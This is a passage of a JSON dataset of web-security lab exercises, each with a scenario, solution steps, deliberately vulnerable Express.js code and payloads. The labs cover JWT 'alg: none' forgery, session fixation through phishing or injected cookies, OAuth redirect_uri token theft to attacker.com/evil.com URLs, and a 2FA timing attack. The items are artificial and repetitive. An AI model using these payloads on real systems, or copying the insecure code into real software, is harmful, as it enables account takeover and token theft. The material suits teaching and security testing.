      "Lab Description": "The API uses JWT tokens for user authorization. However, it trusts the 'alg' header in incoming tokens, enabling algorithm confusion attacks. The application accepts tokens signed with 'none' algorithm, bypassing signature validation. To solve: Forge a token granting admin access and retrieve the admin panel contents.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Postman to capture a legitimate JWT issued to a normal user during login via the /api/login endpoint.",
        "Inspect the JWT structure in jwt.io and observe the use of HS256 algorithm.",
        "Modify the 'alg' field to 'none' and set the 'role' claim to 'admin', leaving the signature section blank.",
        "Send the tampered JWT as a Bearer token in an Authorization header to the /api/admin route.",
        "Verify successful access to the admin panel, indicating bypass of token signature verification."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/api/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('Forbidden'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Welcome to the admin panel'); } else { try { const verified = jwt.verify(token, secret); if (verified.role === 'admin') return res.send('Welcome to the admin panel'); } catch (e) { return res.status(401).send('Invalid token'); } } res.status(403).send('Access denied'); }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Confusion Lab running on port ${PORT}`));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
        "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0."
      ]
    },
    {
      "Lab scenario": "Session fixation via unrotated session cookie after login",
      "Lab Description": "The web application issues a session cookie to all visitors, including unauthenticated ones. However, it fails to rotate the session cookie upon successful login. This enables a session fixation attack. To solve: Fixate Carlos’s session cookie prior to login and hijack his session after authentication.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept a GET request to /login and capture the unauthenticated session cookie.",
        "Send Carlos a crafted phishing link embedding the session ID via query string or manipulate the browser via XSS/social engineering.",
        "Wait until Carlos logs in using the pre-fixed session.",
        "Use the same session ID to access /my-account while impersonating Carlos.",
        "Verify access to Carlos's account with no re-authentication required."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'letmein123' }; app.get('/login', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); sessions[sid] = { loggedIn: false }; res.cookie('sid', sid); res.send('<form method=\"POST\" action=\"/login\">Username:<input name=\"username\">Password:<input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; if (users[username] === password) { sessions[sid].loggedIn = true; sessions[sid].user = username; return res.redirect('/my-account'); } res.send('Login failed'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid] && sessions[sid].loggedIn) return res.send(`Welcome ${sessions[sid].user}`); res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on port ${PORT}`));",
      "payloads": [
        "GET /login HTTP/1.1\\nCookie: sid=attackerfixedsessionid",
        "sid=attackerfixedsessionid in phishing email redirect",
        "Cookie replay: sid=attackerfixedsessionid"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration with open redirect and auto approval",
      "Lab Description": "The application implements OAuth with a third-party identity provider but fails to validate the 'redirect_uri' parameter and automatically grants access tokens. This misconfiguration enables attackers to steal tokens via malicious redirects. To solve: Craft a malicious URL to capture Carlos’s OAuth token.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Inspect the /oauth/authorize endpoint parameters using Burp Suite and note the presence of redirect_uri, response_type, and client_id.",
        "Observe that the redirect_uri can be modified to external domains.",
        "Craft a URL using the known client_id and a malicious redirect_uri pointing to your server.",
        "Trick Carlos into clicking the link (e.g., via social engineering).",
        "Capture the access token appended in the redirect_uri and use it to call /api/userinfo.",
        "Validate that the token grants access to Carlos's profile data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = { carlos: 'abc123xyz' }; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type === 'token') { const token = tokens['carlos']; const uri = `${redirect_uri}#access_token=${token}&token_type=bearer`; return res.redirect(uri); } res.status(400).send('Invalid request'); }); app.get('/api/userinfo', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'abc123xyz') return res.send({ username: 'carlos', email: 'carlos@example.com' }); res.status(403).send('Forbidden'); }); const PORT = 5000; app.listen(PORT, () => console.log(`OAuth Misconfig Lab running on port ${PORT}`));",
      "payloads": [
        "https://vulnerable-app.com/oauth/authorize?response_type=token&client_id=trusted-app&redirect_uri=https://attacker.com/capture",
        "https://attacker.com/capture#access_token=abc123xyz",
        "Authorization: Bearer abc123xyz"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion in token validation logic",
      "Lab Description": "The application uses JWTs to maintain session state but fails to validate the token's algorithm correctly. The backend blindly trusts the `alg` field in the token header. The application accepts unsigned tokens when the `alg` is set to `none`. To solve: Forge a valid token to access Carlos's account without knowing his password.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Intercept a valid JWT token using Burp Suite after logging into your own account.",
        "2. Modify the JWT header to set 'alg' to 'none' and remove the signature section.",
        "3. Modify the payload to set the 'username' claim to 'carlos'.",
        "4. Encode the header and payload in base64url format and concatenate with a period, omitting the signature.",
        "5. Use Postman to send a request to /my-account with the forged token in the Authorization header."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', role: 'admin' }]; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); const user = users.find(u => u.username === decoded.payload.username); if (user) { res.send(`Welcome ${user.username}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session token in login flow",
      "Lab Description": "The application generates session IDs before authentication and does not invalidate them after login. A malicious user can set a known session ID, get the victim to use it, then hijack the session after they log in. To solve: Log in as Carlos by setting and reusing a fixed session cookie.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp to send a GET request to the login page and intercept the Set-Cookie response header.",
        "2. Manually set the session cookie in your browser to 'session=attackersessionid'.",
        "3. Send the crafted login link with the session cookie pre-set to Carlos.",
        "4. Once Carlos logs in using the attacker's session, revisit /my-account with the same session cookie.",
        "5. Confirm session takeover and access the account page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'abc123' }]; app.get('/login', (req, res) => { const sid = req.cookies.session || 'guest-' + Math.random().toString(36).substr(2); res.cookie('session', sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.session] = username; res.send('Logged in'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send(`Account: ${user}`); else res.send('Unauthorized'); }); app.listen(3000);",
      "payloads": [
        "session=attackersessionid",
        "GET /login HTTP/1.1 with Set-Cookie: session=attackersessionid",
        "GET /my-account HTTP/1.1 with Cookie: session=attackersessionid"
      ]
    },
    {
      "Lab scenario": "OAuth implicit grant misconfiguration leaking access token via referer",
      "Lab Description": "The app implements OAuth using the implicit flow, but includes a third-party analytics script that logs full Referer headers. Since access tokens are returned in the URL fragment, these tokens leak to third-party domains. To solve: Capture Carlos's leaked access token and use it to access his account data.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Burp to proxy OAuth login flow and observe the redirect URL fragment.",
        "2. Capture a valid access_token value from the browser's redirect to /oauth/callback.",
        "3. Check the Referer header sent to a third-party script and extract the token from HTTP history.",
        "4. Replay the token in Postman using the Authorization: Bearer header against /api/account.",
        "5. Verify account data of Carlos to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const token = req.query.access_token; res.send(`<script src='https://third-party.io/track.js'></script><h1>Logged in</h1>`); }); app.get('/api/account', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; if (auth === 'valid-oauth-token-for-carlos') { res.send('Account data for carlos'); } else { res.status(401).send('Invalid token'); } }); app.listen(3000);",
      "payloads": [
        "Authorization: Bearer valid-oauth-token-for-carlos",
        "GET /api/account HTTP/1.1 with leaked token",
        "https://example.com/oauth/callback#access_token=valid-oauth-token-for-carlos"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion attack in REST login API",
      "Lab Description": "This lab’s login functionality accepts JWTs for authentication but fails to enforce proper algorithm validation. The application trusts tokens signed with 'none' algorithm. To solve: forge a JWT token impersonating the user 'carlos' and access their profile page via /api/profile.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept POST /api/login with Burp Suite and extract the JWT returned in the Set-Cookie header.",
        "Decode the token using jwt.io or a similar tool and observe the 'alg' header.",
        "Modify the JWT header to use 'alg':'none' and remove the signature.",
        "Modify the payload to {\"user\":\"carlos\"} and re-encode the JWT using base64url.",
        "Send a GET /api/profile request with the forged JWT in the Authorization: Bearer header and confirm Carlos’s data is returned."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 's3cret' }]; app.post('/api/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ user: username }, 'supersecret'); res.cookie('auth', token); res.send('Logged in'); }); app.get('/api/profile', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.header.alg === 'none') { res.send(`Welcome ${payload.payload.user}`); return; } try { const verified = jwt.verify(token, 'supersecret'); res.send(`Welcome ${verified.user}`); } catch (e) { res.status(403).send('Invalid'); } }); app.listen(3000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
        "Authorization: Bearer [none-algorithm-jwt]"
      ]
    },
    {
      "Lab scenario": "Session fixation in OAuth login flow",
      "Lab Description": "This lab is vulnerable to session fixation during OAuth-based third-party login. The application fails to issue a new session token post-authentication. To solve: authenticate as yourself, fix a session ID, and force the victim (Carlos) to reuse the session ID.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp to capture your login request via the OAuth flow and record the session cookie.",
        "Send the fixed session cookie to a victim via phishing or iframe auto-GET with document.cookie injection.",
        "Simulate Carlos logging in by issuing a GET /auth/callback request with the fixed session.",
        "Observe that Carlos inherits your session and gets logged into the attacker session.",
        "Access /account using the fixed session and confirm Carlos's details are exposed."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'oauth-secret', resave: false, saveUninitialized: true })); const users = { 'carlos': {}, 'attacker': {} }; app.get('/login', (req, res) => { const sessionID = req.sessionID; res.redirect(`/auth?state=${sessionID}`); }); app.get('/auth/callback', (req, res) => { const sessionID = req.query.state; req.session.id = sessionID; req.session.user = 'carlos'; res.send('Logged in via OAuth'); }); app.get('/account', (req, res) => { if (req.session.user) res.send(`Account data for ${req.session.user}`); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
      "payloads": [
        "GET /auth/callback?state=[attacker-session-id]",
        "Set-Cookie: connect.sid=[fixed-session-id]"
      ]
    },
    {
      "Lab scenario": "Blind 2FA brute-force with timing side-channel",
      "Lab Description": "The 2FA mechanism leaks processing time differences for valid codes. The backend takes longer to process correct digits. To solve: use timing analysis to brute-force Carlos's 6-digit 2FA code and access his account via /my-account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Log in as Carlos with correct username and password using Burp Suite or Postman.",
        "Send multiple POST /verify requests with different 2FA codes and measure response times using Burp Logger++ or Python’s time module.",
        "Identify the correct digits one-by-one based on increased response delay.",
        "Automate the timing attack using a custom script to determine the full 6-digit code.",
        "Submit the correct code to complete login and access /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); const users = [{ username: 'carlos', password: 'p4ssword', code: '492138' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); req.session = { username }; res.redirect('/2fa'); }); app.post('/verify', (req, res) => { const { username, code } = req.body; const user = users.find(u => u.username === username); for (let i = 0; i < code.length; i++) { if (user.code[i] !== code[i]) return res.status(403).send('Denied'); sleep(100); } res.send('2FA Passed'); }); function sleep(ms) { const start = Date.now(); while (Date.now() - start < ms); } app.get('/my-account', (req, res) => { if (req.session && req.session.username === 'carlos') res.send('Carlos account data'); else res.status(403).send('Unauthorized'); }); app.listen(5000);",
      "payloads": [
        "POST /verify with code=4xxxxx",
        "POST /verify with code=49xxxx",
        "POST /verify with code=4921xx",
        "POST /verify with code=492138"
      ]
    },
    {
      "Lab scenario": "JWT none algorithm tampering in API auth header",
      "Lab Description": "The API uses JWT-based authentication for sensitive endpoints but fails to validate the algorithm used. The application decodes and accepts tokens with `alg: none` without proper signature verification. To solve: Forge a valid JWT that grants admin privileges and access the protected /admin/report endpoint.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Postman to observe a valid JWT issued after login and note the algorithm and claims.",
        "Copy the token and decode it using jwt.io. Confirm that `alg` is set to `HS256` or similar.",
        "Manually change the JWT header to `{ \"alg\": \"none\" }` and payload to `{ \"role\": \"admin\" }`.",
        "Remove the signature part entirely and send the manipulated JWT in the Authorization header using Burp Repeater.",
        "Confirm admin access by receiving a 200 OK response and viewing the report data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin/report', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') return res.send('Sensitive admin report'); } else { jwt.verify(token, SECRET); const decoded = jwt.decode(token); if (decoded.role === 'admin') return res.send('Sensitive admin report'); } res.status(403).send('Access denied'); } catch (e) { res.status(500).send(e.message); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
      ]
    },
    {
      "Lab scenario": "OAuth implicit flow token leak in redirect URI",
      "Lab Description": "The application integrates OAuth2 login using the implicit flow and allows open redirection through the `redirect_uri` parameter. The access token is leaked via URL fragment and reflected in the redirect. To solve: Intercept the OAuth flow and capture Carlos's token using a crafted redirect URI.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to intercept the OAuth2 login initiation flow and identify the authorization URL with response_type=token.",
        "Modify the redirect_uri parameter to a malicious endpoint under your control (e.g., https://attacker.com/#access_token=)",
        "Send the modified link to Carlos using the comment feature on the website (assume CSRF vector or social engineering).",
        "When Carlos clicks the link, the access_token fragment will be appended to your site. Capture this with a listener or webhook.site.",
        "Replay the captured token in the Authorization header and access /my-account as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const users = { 'carlos': { token: 'abc123xyz', role: 'user' } }; app.get('/auth', (req, res) => { const { redirect_uri, response_type } = req.query; if (response_type === 'token') { const accessToken = 'abc123xyz'; res.redirect(`${redirect_uri}#access_token=${accessToken}`); } else { res.status(400).send('Unsupported flow'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === users['carlos'].token) return res.send('Account details for carlos'); res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Token Leak Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "https://vulnerable-site.com/auth?redirect_uri=https://attacker.com/#access_token=&response_type=token",
        "Authorization: Bearer abc123xyz"
      ]
    },
    {
      "Lab scenario": "Session fixation via insecure session ID reuse in cookie",
      "Lab Description": "The application allows users to set their own session ID via a cookie prior to authentication. Upon login, the session ID is not regenerated. An attacker can set a known session value and trick a victim into logging in using it. To solve: Fix a session ID and use it to hijack Carlos's session after he logs in.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Using Burp Suite, access the site while unauthenticated and manually add a session=attacker123 cookie in the request.",
        "Log in with your own credentials and observe that the session ID remains unchanged.",
        "Send a crafted link to Carlos that sets document.cookie = 'session=attacker123' via reflected XSS or social engineering.",
        "After Carlos logs in, reuse the session=attacker123 cookie and visit /my-account.",
        "If session fixation is successful, the response will include Carlos's account data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = { 'carlos': 'secretpass' }; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.session || 'anon'; sessions[sid] = username; res.send('Login successful'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; const user = sessions[sid]; if (user === 'carlos') res.send('Carlos account info'); else res.send('Not authorized'); }); const PORT = 3001; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "Cookie: session=attacker123",
        "document.cookie = 'session=attacker123'",
        "POST /login with session=attacker123 then wait for Carlos to login with same session"
      ]
    },
    {
      "Lab scenario": "JWT tampering using 'alg: none' in Authorization header",
      "Lab Description": "This lab uses JSON Web Tokens (JWT) for user authentication and authorizes access via Bearer tokens. The backend relies on the JWT's `alg` field to determine signature verification. The application fails to enforce algorithm restrictions, allowing manipulation of the `alg` field to 'none' and bypassing signature verification. To solve: tamper with your JWT to impersonate the admin user and access the admin panel.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Capture a valid JWT using Burp Suite by logging in as a regular user.",
        "Decode the token using jwt.io or Burp Decoder. Change `alg` to `none` and `sub` to `admin`.",
        "Remove the signature portion completely, then base64-encode the modified header and payload.",
        "Replace the Authorization header with the forged token in Postman or Burp Repeater.",
        "Send a GET request to /admin and confirm access to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const user = payload.payload.sub; if (user === 'admin') return res.send('Welcome admin'); return res.status(403).send('Forbidden'); } try { const verified = jwt.verify(token, secret); if (verified.sub === 'admin') return res.send('Welcome admin'); res.status(403).send('Forbidden'); } catch { res.status(401).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
        "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
      ]
    },
    {
      "Lab scenario": "Session fixation vulnerability in login flow",
      "Lab Description": "This lab's login system is vulnerable to session fixation. Session IDs are accepted via URL parameters and not regenerated upon successful login. The application trusts client-supplied session tokens, enabling an attacker to set a victim's session before login. To solve: set a session token for Carlos, trick him into logging in, then reuse his session to access /my-account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Generate a valid session token for yourself using /login?user=attacker.",
        "Craft a phishing URL with ?session=attacker-session-token and send it to Carlos (simulated).",
        "Carlos logs in using the provided URL. The session remains the same post-login.",
        "Use the same session token to access /my-account as Carlos.",
        "Verify that Carlos's account page is accessible with the fixed session."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const cookieParser = require('cookie-parser'); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'qwerty123', 'attacker': 'attackpass' }; app.get('/login', (req, res) => { const { user, session } = req.query; if (users[user]) { const sess = session || Math.random().toString(36).substring(2); sessions[sess] = user; res.cookie('session', sess); res.send('Logged in'); } else { res.status(401).send('Invalid user'); } }); app.get('/my-account', (req, res) => { const sess = req.cookies.session; const user = sessions[sess]; if (user === 'carlos') return res.send('Carlos account page'); res.status(403).send('Unauthorized'); }); const PORT = 3001; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "/login?user=carlos&session=attack123",
        "Cookie: session=attack123",
        "GET /my-account with session=attack123"
      ]
    },
    {
      "Lab scenario": "OAuth implicit flow misconfiguration with open redirect",
      "Lab Description": "The OAuth implementation in this app uses the implicit grant flow without validating redirect URIs correctly. The app also accepts open redirects. By chaining these issues, an attacker can steal access tokens by injecting a malicious redirect URI. To solve: steal Carlos’s OAuth token and use it to access his profile.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Initiate an OAuth login and intercept the request to /authorize using OWASP ZAP.",
        "Modify the `redirect_uri` parameter to an attacker-controlled URL with an open redirect back to your server.",
        "Host a simple HTTP listener to capture the token fragment.",
        "Send the phishing OAuth link to Carlos (simulated).",
        "Receive Carlos's token and use Postman to send an authenticated request to /profile."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const url = require('url'); const tokens = { 'carlos': 'token123' }; const openRedirects = ['/redirect?to=http://evil.com']; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type !== 'token') return res.status(400).send('Invalid response_type'); const parsed = url.parse(redirect_uri); if (!parsed.host) return res.status(400).send('Invalid redirect URI'); const token = tokens['carlos']; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === tokens['carlos']) return res.send('Carlos profile page'); res.status(403).send('Unauthorized'); }); const PORT = 3002; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "https://target.com/authorize?client_id=xyz&redirect_uri=http://evil.com/redirect?to=http://attacker.com/capture&response_type=token",
        "#access_token=token123",
        "Authorization: Bearer token123"
      ]
    },
    {
      "Lab scenario": "JWT token manipulation vulnerability in session authorization",
      "Lab Description": "This lab uses JSON Web Tokens (JWT) to manage user sessions. However, it incorrectly validates the token signature due to the use of the 'none' algorithm. The application trusts the user-submitted token without verifying its integrity, enabling privilege escalation via token tampering. To solve: Forge a valid token that grants admin-level access and use it to access the admin panel.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Capture a valid JWT token using Burp Suite's Proxy feature during login.",
        "2. Decode the JWT using jwt.io and observe the algorithm is set to 'HS256'.",
        "3. Change the alg to 'none' and set the payload 'role':'admin'.",
        "4. Remove the JWT signature entirely and re-encode the header and payload.",
        "5. Replace the Authorization header with the forged token in Burp Repeater and access /admin panel."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username: 'admin', role: 'admin' }, 'secret'); res.json({ token }); } else { const token = jwt.sign({ username, role: 'user' }, 'secret'); res.json({ token }); } }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.role === 'admin') { res.send('Welcome admin!'); } else { res.status(403).send('Access denied'); } }); app.listen(3000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
        "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session ID in cookie management",
      "Lab Description": "This lab uses a session cookie to maintain user authentication states. However, the session ID is set before login and is not regenerated upon successful authentication, allowing an attacker to fix a session for a victim before they log in. To solve: Fix a session for Carlos, make him log in, then reuse the session ID to access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use OWASP ZAP to intercept the login request and observe the Set-Cookie header before authentication.",
        "2. Note the session cookie value and send Carlos a phishing link containing it (simulate via cookie replay).",
        "3. Wait for Carlos to log in (assume passive login simulation).",
        "4. Replay the session ID in a new request with Burp Repeater to access Carlos's authenticated session.",
        "5. Navigate to /my-account using the fixed session cookie to verify the exploit."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { carlos: 'pass123' }; app.get('/login', (req, res) => { const sessionId = Math.random().toString(36).substring(2); res.cookie('session', sessionId); res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/></form>'); }); app.post('/login', (req, res) => { const sessionId = req.cookies.session; const { username, password } = req.body; if (users[username] === password) { sessions[sessionId] = username; res.send('Logged in'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send(`Account details for ${user}`); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
      "payloads": [
        "Cookie: session=abc123456def789",
        "Cookie: session=fixedsessionidvalue",
        "Cookie: session=carlosSession001"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration in third-party login endpoint",
      "Lab Description": "This lab uses OAuth for federated login through a third-party provider. However, the redirect URI is not strictly validated, allowing an attacker to manipulate the redirection flow and gain access to a valid session. To solve: Exploit the redirect_uri parameter to hijack a session token from the OAuth flow and log in as the victim.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Postman to initiate the OAuth login flow and observe the redirect_uri value.",
        "2. Modify the redirect_uri to a domain controlled by you (simulate local endpoint).",
        "3. Capture the OAuth token or code sent to your malicious redirect.",
        "4. Exchange the captured token for a session using the vulnerable /oauth/callback endpoint.",
        "5. Use the session to access /my-account as the victim user."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const code = 'fake-auth-code'; res.redirect(`${redirect_uri}?code=${code}`); }); app.get('/oauth/callback', (req, res) => { const { code } = req.query; if (code === 'fake-auth-code') { res.cookie('session', 'victim-session'); res.send('OAuth login successful'); } else { res.status(401).send('Invalid code'); } }); app.get('/my-account', (req, res) => { const session = req.headers.cookie?.split('=')[1]; if (session === 'victim-session') { res.send('Welcome, OAuth user!'); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
      "payloads": [
        "https://vulnerable.site/auth?redirect_uri=https://attacker.com/callback",
        "https://vulnerable.site/auth?redirect_uri=http://localhost:1337/hook",
        "https://vulnerable.site/auth?redirect_uri=https://example.com/oauth/exploit"
      ]
    },
    {
      "Lab scenario": "Session fixation attack in login flow",
      "Lab Description": "The session management in this application fails to regenerate session identifiers after login. The application accepts pre-set session cookies from unauthenticated users and continues to use the same session after successful login. To solve: hijack a logged-in session by fixing the session token prior to user authentication.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite to intercept a GET /login request while unauthenticated and note the session cookie issued.",
        "2. Send a phishing link with your pre-issued session ID as a query parameter to the victim.",
        "3. The victim clicks the link, logs in, and reuses your session ID, which is not regenerated after login.",
        "4. Use the same session ID in your browser and navigate to /account.",
        "5. Verify you have access to the victim’s session by confirming the displayed username."
      ],
      "Vulnerability name": "Authentication",
